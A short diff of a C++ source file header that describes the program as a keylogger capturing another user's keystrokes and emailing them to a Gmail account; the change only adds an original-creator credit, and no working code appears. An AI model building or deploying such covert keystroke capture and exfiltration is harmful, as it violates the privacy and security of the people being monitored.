@@ -4,8 +4,10 @@ another user's keystrokes. It will then
 send these keystrokes in a form of
 an email attachment to a gmail user.
 
-Created by: Victor Nguyen
-Date:            07/13/17
+Original creator:   Ermin Kreponic
+                (Creator69 on GitHub)
+Created by:         Victor Nguyen
+Date:               07/13/17
 **********************************************/
 #include <iostream>
 #include <windows.h>
